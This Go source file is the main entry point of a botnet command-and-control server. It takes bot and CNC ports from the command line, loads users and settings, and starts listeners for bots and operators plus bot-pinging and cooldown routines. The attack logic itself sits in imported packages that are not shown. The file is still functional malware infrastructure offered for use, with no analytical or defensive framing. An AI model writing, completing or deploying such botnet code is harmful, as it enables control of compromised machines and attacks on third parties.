package main

import (
	"cnc/internal/bot"
	"cnc/internal/cnc"
	"cnc/internal/config"
	"fmt"
	"os"
	"os/signal"
	"strconv"
	"syscall"
)

func main() {
	if len(os.Args) != 4 {
		fmt.Println("Bad argument\nUsage: ./botnet <bot_port> <threads> <cnc_port>")
		return
	}

	botPort, err1 := strconv.Atoi(os.Args[1])
	cncPort, err2 := strconv.Atoi(os.Args[3])

	if err1 != nil || err2 != nil {
		fmt.Println("Invalid port number")
		return
	}

	config.ReadSettings()
	config.LoadUsers()

	go bot.BotListener(botPort)
	go cnc.CncListener(cncPort)
	go bot.PingBots()
	go cnc.ManageCooldown()

	fmt.Printf("Botnet started on bot port %d and CNC port %d\n", botPort, cncPort)

	sc := make(chan os.Signal, 1)
	signal.Notify(sc, syscall.SIGINT, syscall.SIGTERM, os.Interrupt, syscall.SIGTERM)
	<-sc
}
